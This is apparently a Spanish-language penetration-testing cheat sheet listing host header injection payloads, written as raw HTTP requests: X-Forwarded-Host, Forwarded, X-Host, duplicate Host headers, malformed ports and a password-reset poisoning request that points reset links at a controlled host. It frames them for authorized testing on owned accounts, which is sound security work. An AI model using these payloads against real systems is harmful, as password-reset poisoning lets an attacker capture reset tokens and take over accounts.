# 🗡️ Host header injection: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. Host directo

**Objetivo:** Inspeccionar URLs absolutas y redirecciones generadas para cuenta propia.

```http
GET / HTTP/1.1
Host: {CONTROLLED_HOST}
```

**Interpretación:** Un 400 es normal. Un Location con host controlado es primitive; impacto depende del flujo.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting).

### 2. X-Forwarded-Host

**Objetivo:** Proxy mantiene Host válido y backend podría confiar en la cabecera adicional.

```http
GET / HTTP/1.1
Host: {ORIGEN}
X-Forwarded-Host: {CONTROLLED_HOST}
```

**Interpretación:** Comparar URLs absolutas con control sin cabecera.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting).

### 3. Forwarded host=

**Objetivo:** Alternativa estandarizada con sintaxis RFC 7239.

```http
GET / HTTP/1.1
Host: {ORIGEN}
Forwarded: host={CONTROLLED_HOST};proto=https
```

**Interpretación:** Confirmar que el host se usa en el sink, no solo se refleja.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting).

### 4. X-Host

**Objetivo:** Cabecera de override usada por algunas pilas; confirmar manualmente.

```http
GET / HTTP/1.1
Host: {ORIGEN}
X-Host: {CONTROLLED_HOST}
```

**Interpretación:** Un cambio de respuesta sugiere soporte; no implica control sobre correo o caché.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting).

### 5. Host duplicado

**Objetivo:** Solo en laboratorio o endpoint aislado; proxies pueden seleccionar el primero o segundo.

```http
GET /test-owned HTTP/1.1
Host: {ORIGEN}
Host: {CONTROLLED_HOST}
```

**Interpretación:** Comparar routing y URL generada; un error o cierre de conexión es defensa esperada.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting).

### 6. URL absoluta en línea de request

**Objetivo:** Explorar discrepancia entre request target absoluto y Host.

```http
GET https://{ORIGEN}/test-owned HTTP/1.1
Host: {CONTROLLED_HOST}
```

**Interpretación:** Dos capas pueden elegir host distinto; usar solo recursos propios y comprobar cuál componente respondió.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting).

### 7. Host con puerto no numérico

**Objetivo:** Comprobar si el validador descarta el puerto antes de construir enlaces; solo en laboratorio.

```http
GET /test-owned HTTP/1.1
Host: {ORIGEN}:prueba-123
```

**Interpretación:** Un enlace absoluto que retiene el sufijo muestra un desacuerdo de parseo; confirmar impacto en un flujo real.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting).

### 8. Reset poisoning en correo propio

**Objetivo:** Enviar exclusivamente a email de prueba; buscar enlace generado desde Host no confiable.

```http
POST /forgot-password HTTP/1.1
Host: {ORIGEN}
X-Forwarded-Host: {CONTROLLED_HOST}
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO}
```

**Interpretación:** Confirmar el host dentro del correo real y proteger el token; no basta la respuesta HTTP.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
